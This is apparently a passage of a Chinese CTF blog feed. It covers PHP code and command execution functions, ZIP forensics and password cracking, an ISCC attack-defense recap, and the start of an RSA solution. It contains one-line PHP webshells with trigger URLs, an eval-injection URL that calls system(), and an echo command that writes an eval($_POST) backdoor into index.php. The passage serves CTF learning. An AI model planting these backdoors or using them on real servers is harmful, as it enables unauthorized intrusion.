?&gt;</code></pre><p>常见的一句话木马，访问：</p><pre><code>http://xxx/php_cmd.php?a=phpinfo();</code></pre><p>得到phpinfo页面。这里注意将字符串当作code执行，也就是说我们传入的字符串要符合php规范，分号不能忘。</p><p>assert()</p><blockquote><p>assert — 检查一个断言是否为 FALSE</p></blockquote><p>php5</p><pre><code>bool assert( mixed $assertion[, string $description] )</code></pre><p>php7</p><pre><code>bool assert( mixed $assertion[, Throwable $exception] )</code></pre><blockquote><p>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。 </p></blockquote><pre><code>&lt;?php    assert($_GET[&apos;a&apos;]);    ?&gt;</code></pre><p>此时访问phpinfo()不用加分号也能得到对应页面。</p><p>preg_replace</p><blockquote><pre><code>preg_replace — 执行一个正则表达式的搜索和替换</code></pre></blockquote><pre><code>mixed preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &amp;$count]] )</code></pre><p>搜索subject中匹配pattern的部分，以replacement进行替换。</p><p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符即(：’、”、 \ 和 NULL) 然后进行后向引用替换，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。如果要在replacement 中使用反斜线，必须使用4个(“\\“，译注：因为这首先是php的字符串，经过转义后，是两个，再经过正则表达式引擎后才被认为是一个原文反斜线)。 </p><blockquote><p>PHP 5.5.0 起， 传入 “\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\e” 也无法起效。</p></blockquote><p>call_user_func()</p><blockquote><p>call_user_func — 把第一个参数作为回调函数调用</p></blockquote><pre><code>mixed call_user_func( callable $callback[, mixed $parameter[, mixed $...]] )&lt;?php    call_user_func($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);?&gt;</code></pre><p>访问：</p><pre><code>http://xxx/php_cmd.php?a=assert&amp;b=phpinfo()</code></pre><p>call_user_func_array()</p><blockquote><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p></blockquote><pre><code>mixed call_user_func_array( callable $callback, array $param_arr)</code></pre><p>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。 </p><pre><code>&lt;?php    call_user_func_array($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);?&gt;</code></pre><p>访问：</p><pre><code>http://xxx/php_cmd.php?a=assert&amp;b[]=phpinfo()</code></pre><p>create_function</p><blockquote><p>create_function — Create an anonymous (lambda-style) function</p></blockquote><pre><code>string create_function( string $args, string $code)</code></pre><p>Creates an anonymous function from the parameters passed, and returns a unique name for it.<br>第一个参数args是后面定义函数的参数，第二个参数是函数的代码。</p><blockquote><p>This function internally performs an eval() and as such has thesame security issues as eval(). </p></blockquote><pre><code>&lt;?php    $a = $_GET[&apos;c&apos;];    $b = create_function(&apos;$a&apos;,&quot;echo $a&quot;);    $b(&apos;&apos;);?&gt;</code></pre><p>访问</p><pre><code>http://xxx/php_cmd.php?c=phpinfo();</code></pre><p>array_map</p><blockquote><p>array_map — 为数组的每个元素应用回调函数 </p></blockquote><pre><code>array array_map( callable $callback, array $array1[, array $...] )</code></pre><p>array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。 </p><pre><code>&lt;?php    $array = array(0,1,2,3,4,5);    array_map($_GET[&apos;a&apos;],$array);?&gt;</code></pre><p>访问</p><pre><code>http://xxx/php_cmd.php?a=phpinfo</code></pre><p>没有分号<code>;</code>也没有括号<code>()</code>！同时从返回结果也可以看出array中的数组数量决定了返回值的数量。</p><h3 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h3><p>system()</p><blockquote><p>system — 执行外部程序，并且显示输出</p></blockquote><pre><code>string system( string $command[, int &amp;$return_var] )</code></pre><blockquote><p>同 C 版本的 system() 函数一样，本函数执行 command 参数所指定的命令，并且输出执行结果。 如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p><p>如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。 </p></blockquote><pre><code>&lt;?php    system(&apos;whoami&apos;);?&gt;</code></pre><p>passthru()</p><blockquote><p>passthru — 执行外部程序并且显示原始输出</p></blockquote><pre><code>void passthru( string $command[, int &amp;$return_var] )</code></pre><blockquote><p>同 exec() 函数类似， passthru() 函数也是用来执行外部命令（command）的。当所执行的 Unix 命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代 exec() 或 system() 函数。常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。通过设置 Content-type 为 image/gif，然后调用 pbmplus 程序输出 gif 文件，就可以从 PHP 脚本中直接输出图像到浏览器。<br>如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。 </p></blockquote><pre><code>&lt;?php    passthru(&quot;whoami&quot;);?&gt;</code></pre><p>exec()</p><blockquote><p>exec — 执行一个外部程序</p></blockquote><pre><code>string exec( string $command[, array &amp;$output[, int &amp;$return_var]] )</code></pre><p>exec() 执行 command 参数所指定的命令。</p><blockquote><p>如果提供了 output 参数，那么会用命令执行的输出填充此数组，每行输出填充数组中的一个元素。数组中的数据不包含行尾的空白字符，例如 \n 字符。请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加，请在传入 exec() 函数之前对数组使用 unset() 函数进行重置。<br>如果同时提供 output 和 return_var 参数，命令执行后的返回状态会被写入到此变量</p></blockquote><pre><code>&lt;?php    echo exec(&quot;whoami&quot;);?&gt;</code></pre><p>pcntl_exec()</p><blockquote><p>pcntl_exec — 在当前进程空间执行指定程序</p></blockquote><pre><code>void pcntl_exec( string $path[, array $args[, array $envs]] )</code></pre><p>以给定的参数执行程序</p><blockquote><p>path必须时可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本）。<br>args是一个要传递给程序的参数的字符串数组。<br>envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。 </p></blockquote><pre><code>&lt;?php    pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));?&gt;</code></pre><p>shell_exec()</p><blockquote><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p></blockquote><pre><code>&lt;?php    echo shell_exec(&quot;whoami&quot;);?&gt;</code></pre><p>popen()</p><blockquote><p>popen — 打开进程文件指针</p></blockquote><pre><code>resource popen( string $command, string $mode)</code></pre><blockquote><p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。<br>当模式为 ‘r’，返回的文件指针等于命令的 STDOUT，当模式为 ‘w’，返回的文件指针等于命令的 STDIN。 </p></blockquote><pre><code>&lt;?php$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);?&gt; </code></pre><p>proc_open()</p><blockquote><p>proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。 </p></blockquote><pre><code>resource proc_open( string $cmd, array $descriptorspec, array &amp;$pipes[, string $cwd[, array $env[, array $other_options]]] )</code></pre><blockquote><p>descriptorspec<br>一个索引数组。数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。 </p><p>数组中的元素可以是：<br>•包含了要传送至进程的管道的描述信息。第一个元素为描述符类型，第二个元素是针对该描述符的选项。有效的类型有：pipe （第二个元素可以是： r 向进程传送该管道的读取端，w 向进程传送该管道的写入端），以及 file（第二个元素为文件名）。<br>•表达一个真实文件描述符的流资源类型（例如：已打开的文件，一个 socket 端口，STDIN）。 </p></blockquote><p>`(反单引号)</p><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p><pre><code>&lt;?php    echo `whoami`;?&gt;</code></pre><p>ob_start()</p><blockquote><p>ob_start — 打开输出控制缓冲</p></blockquote><pre><code>bool ob_start([ callback $output_callback[, int $chunk_size[, bool $erase]]] )</code></pre><blockquote><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。 </p></blockquote><p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(cmd)中的cmd，把我们输入的_GET[a]作为cmd的参数。</p><pre><code>&lt;?php    $cmd = &apos;system&apos;;    ob_start($cmd);    echo &quot;$_GET[a]&quot;;    ob_end_flush();?&gt;</code></pre><p>访问：</p><pre><code>http://xxx/php_cmd.php?a=whoami</code></pre><p>php mail()</p><p>mail()文档<a href="http://php.net/manual/zh/function.mail.php" title="mail文档" target="_blank" rel="noopener">http://php.net/manual/zh/function.mail.php</a></p><pre><code>bool mail (    string $to ,    string $subject ,    string $message [,    string $additional_headers [,    string $additional_parameters ]])</code></pre><p>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项：</p><pre><code>配置SMTP服务器的主机名和端口配置PHP用作邮件传输代理（MTA）的文件路径</code></pre><p>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。</p><p>实例：<a href="http://blog.nsfocus.net/tag/php-mail%E5%87%BD%E6%95%B0%E5%BC%95%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E/" title="多个php mail函数引发的命令执行漏洞" target="_blank" rel="noopener">http://blog.nsfocus.net/tag/php-mail%E5%87%BD%E6%95%B0%E5%BC%95%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E/</a></p><p>参考：<a href="http://www.91ri.org/17039.html" title="为什么mail()函数在php中是危险的" target="_blank" rel="noopener">http://www.91ri.org/17039.html</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZIP&#39;s things</title>
      <link href="/2019/03/23/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2019/03/23/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>只要我E的够快，寂寞就追不上我！</p><p>对不起，走错片场了~😄</p><a id="more"></a><p>##0x01 zip文件组成 ##</p><p><strong>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</strong></p><h3 id="1-压缩源文件数据区"><a href="#1-压缩源文件数据区" class="headerlink" title="1 压缩源文件数据区"></a>1 压缩源文件数据区</h3><p>在这个数据区中每个压缩文件的源文件/目录都是一条记录，记录格式如下[文件头+文件数据+数据描述符]</p><h4 id="文件头结构"><a href="#文件头结构" class="headerlink" title="文件头结构"></a>文件头结构</h4><hr><pre><code>      组成    　                长度  文件头标记                  4 bytes  (0x04034b50)  解压文件所需 pkware 版本    2 bytes 全局方式位标记              2 bytes压缩方式                    2 bytes最后修改文件时间             2 bytes最后修改文件日期             2 bytesCRC-32校验                  4 bytes压缩后尺寸                  4 bytes未压缩尺寸                  4 bytes文件名长度                  2 bytes  扩展记录长度                2 bytes文件名                     （不定长度）扩展字段                   （不定长度）</code></pre><h4 id="文件数据"><a href="#文件数据" class="headerlink" title="文件数据"></a>文件数据</h4><p>就是数据</p><h4 id="数据描述符"><a href="#数据描述符" class="headerlink" title="数据描述符"></a>数据描述符</h4><hr><pre><code> 　　　组成    　长度CRC-32校验                  4 bytes压缩后尺寸                   4 bytes未压缩尺寸                   4 bytes</code></pre><p>这个数据描述符只在全局方式位标记的第三位设为1时才存在，紧接在压缩数据的最后一个字节后。</p><h3 id="2-压缩源文件目录区"><a href="#2-压缩源文件目录区" class="headerlink" title="2.压缩源文件目录区"></a>2.压缩源文件目录区</h3><p>在这个数据区中每一条记录对应在压缩源文件区中的一条数据</p><hr><pre><code>   　　　组成               　            长度　　目录中文件文件头标记             4 bytes  (0x02014b50)　　压缩使用的　pkware 版本          2 bytes　　解压文件所需 pkware 版本         2 bytes　　全局方式位标记                   2 bytes　　压缩方式                        2 bytes　　最后修改文件时间                 2 bytes　　最后修改文件日期                 2 bytes　　ＣＲＣ－３２校验                 4 bytes　　压缩后尺寸                      4 bytes　　未压缩尺寸                      4 bytes　　文件名长度                      2 bytes　　扩展字段长度                    2 bytes　　文件注释长度                    2 bytes　　磁盘开始号                      2 bytes　　内部文件属性                    2 bytes　　外部文件属性                    4 bytes局部头部偏移量                  4 bytes　　文件名                       （不定长度）　　扩展字段                     （不定长度）文件注释                     （不定长度）</code></pre><h3 id="3-压缩源文件目录结束标志"><a href="#3-压缩源文件目录结束标志" class="headerlink" title="3.压缩源文件目录结束标志"></a>3.压缩源文件目录结束标志</h3><hr><pre><code>　　　组成               　          长度目录结束标记                    4 bytes  (0x02014b50)当前磁盘编号                    2 bytes目录区开始磁盘编号              2 bytes　　本磁盘上纪录总数                 2 bytes　　目录区中纪录总数                 2 bytes　　目录区尺寸大小                   4 bytes　　目录区对第一张磁盘的偏移量        4 bytes　　ZIP 文件注释长度                 2 bytes　　ZIP 文件注释                   （不定长度）</code></pre><p>这里可以注意到文件目录结束标志只有22位，如果超出这部分则可能是隐藏数据(今天真的是被桂电的MISC给虐哭了/(ㄒoㄒ)/~~)。</p><h2 id="0x02-ZIP伪加密"><a href="#0x02-ZIP伪加密" class="headerlink" title="0x02 ZIP伪加密"></a>0x02 ZIP伪加密</h2><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kazyuumnj30gx0de41x.jpg" alt></p><p>压缩源文件数据区–头文件标志：50 4B 03 04</p><p>压缩源文件目录区：</p><ul><li>目录中文件文件头标志：50 4B 01 02</li><li>压缩使用的pkware:     3F 00</li><li>紧跟着是解压文件所需要的pkware版本：14 00</li><li>全局方式位标记：00 00(更改这里进行伪加密，改为09 00就会提示有密码，实际上只要是以奇数结尾即可)</li></ul><p>压缩源文件目录结束标志：50 4B 05 06</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kb023lp3j30gx0d4jug.jpg" alt></p><p>如何判断伪加密？</p><p>无加密</p><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00</p><p>假加密</p><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><p>真加密</p><p>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><h2 id="0x03-ZIP明文攻击"><a href="#0x03-ZIP明文攻击" class="headerlink" title="0x03 ZIP明文攻击"></a>0x03 ZIP明文攻击</h2><p>如果一个压缩包你不知道密码，但是压缩包里有一个已知文件（文件大小大于12Byte），因为同一个压缩包里的文件都是采用同一个密钥加密，所以可以用已知文件来找密钥。</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kb052ll8j30g70fhwhx.jpg" alt></p><h2 id="0x03-ZIP掩码攻击"><a href="#0x03-ZIP掩码攻击" class="headerlink" title="0x03 ZIP掩码攻击"></a>0x03 ZIP掩码攻击</h2><p>已知密码的某几位进行构造，这里以桂电的MISC为例，前面我们已经解开两层加密，得到了最后的111.zip,<br>里面有</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kb0bwn1ej305b02bt8i.jpg" alt></p><p>打开.sh文件是这样的内容</p><pre><code>#!/bin/bash#zip -e --password=`python -c &quot;print(__import__(&apos;time&apos;).time())&quot;` flag.zip flag</code></pre><p>跑一下命令</p><pre><code>&gt;&gt;&gt; print(__import__(&apos;time&apos;).time())1558685006.11</code></pre><p>大概形式知道了尝试掩码攻击</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kb0ltqooj30fh0f0gp8.jpg" alt></p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kb0oiik6j30f206d0tr.jpg" alt></p><h2 id="0x04-CRC32碰撞"><a href="#0x04-CRC32碰撞" class="headerlink" title="0x04 CRC32碰撞"></a>0x04 CRC32碰撞</h2><p>CRC本身是循环冗余校验码的意思，CRC32则表示产生一个32bit（8位十六进制数）的校验值</p><p>在生成该校验值的时候源数据每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容。<br>这里做测试用我们创建了一个内容只有‘1234’的txt文件并进行压缩，得到压缩的CRC值，写脚本进行爆破</p><pre><code>import binasciicrc=0x9BE3E0A3for i in range(1000,9999+1):if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc:    print i</code></pre><p>由于内容较短几秒就碰撞出文件内容。</p><p>在PY2.x版本中。binascii.crc32中所计算出的CRC值域为[-2^31,2^31-1]之间的有符号整数，为了与一般的CRC结果对比，需要将其转换为无符号整数，所以加上 &amp; 0xfffffffff来进行转换</p><pre><code>&gt;&gt;&gt; str1=0x4D2&gt;&gt;&gt; str2=str1 &amp; 0xffff&gt;&gt;&gt; print str21234</code></pre><p>如果是py3.x版本计算结果为无符号整数，就不用加了。 </p><h2 id="0x05-其他乱七八糟的"><a href="#0x05-其他乱七八糟的" class="headerlink" title="0x05 其他乱七八糟的"></a>0x05 其他乱七八糟的</h2><h3 id="关于fcrackzip"><a href="#关于fcrackzip" class="headerlink" title="关于fcrackzip"></a>关于fcrackzip</h3><p>作为kali自带的工具，可以使用它来进行爆破工作，这里还是用桂电的MISC-222.zip为例</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kb0955f3j30ls0fndvz.jpg" alt></p><p>由菜单可知-b 是爆破，-c 指定字符集,-l指定长度,-u 用解压的方式淘汰掉错误的密码。当然我们也可以跑字典</p><pre><code># fcrackzip -D -p /字典位置/xxx.txt  -u crack_this.zip</code></pre><h3 id="关于图片格式问题"><a href="#关于图片格式问题" class="headerlink" title="关于图片格式问题"></a>关于图片格式问题</h3><p>png文件署名域</p><ul><li>十进制数：137 80 78 71 13 10 26 10</li><li>十六进制：89 50 4e 47 0d 0a 1a 0a</li></ul><h3 id="文件头总结"><a href="#文件头总结" class="headerlink" title="文件头总结"></a>文件头总结</h3><pre><code>JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　PNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82GIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4BTIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：Windows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：CAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：Adobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：HTML (html)，                           文件头：68746D6C3EEmail [thorough only] (eml)，     文件头：44656C69766572792D646174653AOutlook Express (dbx)，            文件头：CFAD12FEC5FD746FOutlook (pst)，                         文件头：2142444EMS Word/Excel (xls.or.doc)，      文件头：D0CF11E0MS Access (mdb)，                    文件头：5374616E64617264204AWordPerfect (wpd)，                  文件头：FF575043Adobe Acrobat (pdf)，               文件头：255044462D312EQuicken (qdf)，                         文件头：AC9EBD8FWindows Password (pwl)，         文件头：E3828596RAR Archive (rar)，                    文件头：52617221Wave (wav)，                            文件头：57415645AVI (avi)，                                 文件头：41564920Real Audio (ram)，                     文件头：2E7261FDReal Media (rm)，                       文件头：2E524D46MPEG (mpg)，                           文件头：000001BAMPEG (mpg)，                           文件头：000001B3Quicktime (mov)，                     文件头：6D6F6F76Windows Media (asf)，               文件头：3026B2758E66CF11MIDI (mid)，                              文件头：4D546864</code></pre><h3 id="zip文件格式"><a href="#zip文件格式" class="headerlink" title="zip文件格式"></a>zip文件格式</h3><p>翻译作者的文章链接<br><a href="https://blog.csdn.net/luoye7422/article/details/41878969" target="_blank" rel="noopener">https://blog.csdn.net/luoye7422/article/details/41878969</a></p><p>参考链接</p><blockquote><p><a href="https://www.jianshu.com/p/4d8cace82028" title="图片格式详解" target="_blank" rel="noopener">https://www.jianshu.com/p/4d8cace82028</a><br>更详细解释：<a href="https://blog.csdn.net/u012611878/article/details/52215985" target="_blank" rel="noopener">https://blog.csdn.net/u012611878/article/details/52215985</a><br><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865" target="_blank" rel="noopener">https://blog.csdn.net/xiangshangbashaonian/article/details/80156865</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zip </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 ISCC线下赛回顾</title>
      <link href="/2018/07/22/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%9B%9E%E9%A1%BE/"/>
      <url>/2018/07/22/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%9B%9E%E9%A1%BE/</url>
      
        <content type="html"><![CDATA[<p>不比不知道自己跟大佬差距有多大！开局直接全场被大佬挂黑页，等着运维回复几个小时之后好不容易找到shell路径，shell又被其他大佬删了…真是菜哭了，一下午的比赛毫无作为…</p><a id="more"></a><h2 id="web1-私地渗透"><a href="#web1-私地渗透" class="headerlink" title="web1 私地渗透"></a>web1 私地渗透</h2><p>先是注册页面拿到shell路径，具体操作看SQL那篇吧。</p><p>拿到路径之后访问之后是这样的</p><pre><code>&lt;?phpshow_source(__FILE__);$a=@$_REQUEST[&apos;a&apos;];@eval(&quot;var_dump($$a);&quot;);?&gt;</code></pre><p>先分析一下代码，主要几个函数</p><ul><li>show_source():查看文件源码</li><li>eval():把字符串当做php代码执行</li><li>var_dump():打印变量信息，返回值为null</li></ul><p>这里有明显的变量引用，我们可以控制$a的值来命令执行。</p><h3 id="php中单引号与双引号的区别"><a href="#php中单引号与双引号的区别" class="headerlink" title="php中单引号与双引号的区别"></a>php中单引号与双引号的区别</h3><pre><code>&lt;?php$c=&quot;Luc1fer!&quot;;echo &quot;My name is &quot;.$c.&quot;&lt;br&gt;&quot;;       //不加引号echo &quot;My name is &quot;.&apos;$c&apos;.&quot;&lt;br&gt;&quot;;        //单引号echo &quot;My name is &quot;.&quot;$c&quot;.&quot;&lt;br&gt;&quot;;        //双引号echo &quot;My name is &quot;.&quot; &apos;$c&apos; &quot;.&quot;&lt;br&gt;&quot;;    //双引号+单引号echo &quot;My name is &quot;.&apos; &quot;$c&quot; &apos;.&quot;&lt;br&gt;&quot;; //单引号+双引号?&gt;</code></pre><p>输出结果如下</p><pre><code>My name is Luc1fer!                    //正常显示My name is $c                        //单引号不被解析My name is Luc1fer!                    //双引号内正常解析My name is &apos;Luc1fer!&apos;                //双引号内正常解析My name is &quot;$c&quot;                     //单引号内不被解析</code></pre><h3 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h3><p>测试代码：</p><pre><code>&lt;?phpshow_source(__FILE__);$b=&quot;Hello,my name is Luc1fer!&quot;;$a=@$_REQUEST[&apos;a&apos;];echo $$a;?&gt;</code></pre><p>结果如下：</p><pre><code> &lt;?phpshow_source(__FILE__);$b=&quot;Hello,my name is Luc1fer!&quot;;$a=@$_REQUEST[&apos;a&apos;];echo $$a;?&gt; Hello,my name is Luc1fer!</code></pre><p>代码的执行过程大概为  <code>get一个a--&gt;echo执行从右到左--&gt;echo $$a--&gt;echo $b--&gt;打印$b</code><br>我们可以通过?a=a=”hello”这样的方式来打印hello</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>对于var_dump()我们可以构造单引号使其闭合</p><pre><code>&lt;?phpshow_source(__FILE__);$a=@$_REQUEST[&apos;a&apos;];@eval(&quot;var_dump($$a);&quot;);?&gt;http://localhost/only-test-php.php?a=a=4);system(phpinfo()</code></pre><p>这样就可以打印phpinfo()信息了</p><p>同样的我们可以cat flag了.</p><h2 id="私地与高地"><a href="#私地与高地" class="headerlink" title="私地与高地"></a>私地与高地</h2><h3 id="主要问题"><a href="#主要问题" class="headerlink" title="主要问题"></a>主要问题</h3><p>等拿到私地权限之后就只剩40多分钟了，WINSCP死活连不上私地，没办法像往常一样down源码，上监控上waf，有点手忙脚乱，这边Xshell连上了，查看www目录发现全是马，打开几个手动注释了马，其他的都是readonly文件</p><ol><li>面对被写上的马，如果我是ctf权限，且文件readonly该怎么删掉这个马？</li></ol><p>赛后和老师讨论，老师说连不上WINSCP为什么不用wegt命令下源码？这个当时确实没想到，下次要注意。还有没上脚本的问题，同学指出可以直接用vim打开之后复制粘贴进去监控脚本，这个当时确实懵圈了，只在那傻傻的手工注释。</p><p>2.面对不死马我该怎么去删掉这个不死马？</p><p>比赛前准备的方法有kill进程、重启Apache、创建同名文件，这些在这次比赛中都没有真正实践到</p><p>3.如何在拿到权限之后批量给别人传马？</p><p>说实话我这个地方还是没懂，按理说应该是利用预留的后门然后执行写入命令</p><pre><code>echo -e &quot;&lt;?php eval(\@_POST[&apos;a&apos;]);?&gt;&quot; &gt; index.php | chomod 777 index.php</code></pre><p>但是怎么批量呢？用批量提交flag那个么？还带去问问师傅</p>]]></content>
      
      
      <categories>
          
          <category> 比赛回顾 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛回顾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA</title>
      <link href="/2018/05/23/RSA/"/>
      <url>/2018/05/23/RSA/</url>
      
        <content type="html"><![CDATA[<p>我才二十出头，为什么要承受这么多…</p><a id="more"></a><p>pubkey.pem文件构成</p><p>Jarvis OJ mediumRSA为例</p><p>下载文件我们得到了flag.enc和pubkey.pem，<br>使用openssl来获取公钥信息</p><pre><code>root@kali-ctf:~/RSA/mediumRSA# openssl rsa -pubin -in pubkey.pem -text -modulusPublic-Key: (256 bit)Modulus:00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY-----</code></pre><p>这里的Exponent：65537(0x10001) 即为e.</p><p>Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD 即为N.</p><p>这里通过看<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9430579.html" title="大佬博客" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9430579.html</a>简单说一下pem文件组成。</p><p>简单来讲，pem文件就是用于ASCII(Base64)编码的各种X.509 v3证书。</p><p>文件由BEGIN开始，END结束。文件内容要根据base64编码解码之后，得到的数据进行增加或删减特殊字符等。</p><p>接着上面的题目，我们已经知道了n,e，接着去factor分解N得到p,q，生成私钥后解密flag.enc文件。</p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-import gmpy2from Crypto.Util.number import long_to_bytesp = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239n = 87924348264132406875276140514499937145050893665602592992418171647042491658461e = 65537d = gmpy2.invert(e, (p - 1) * (q - 1))with open(&apos;flag.enc&apos;, &apos;r&apos;) as f:        c = f.read().encode(&apos;hex&apos;)        c = int(c, 16)m = pow(c, d, n)print long_to_bytes(m)</code></pre><p>这里再说一下openssl</p><ul><li><p>查看公钥文件 </p></li><li><p>  openssl rsa -pubin -in pubkey.pem -text -modulus</p></li><li><p>解密</p></li><li><p><code>rsautl -decrypt -inkey private.pem -in flag.enc -out flag</code></p></li></ul><h2 id="模数相关攻击"><a href="#模数相关攻击" class="headerlink" title="模数相关攻击"></a>模数相关攻击</h2><h3 id="d泄露攻击"><a href="#d泄露攻击" class="headerlink" 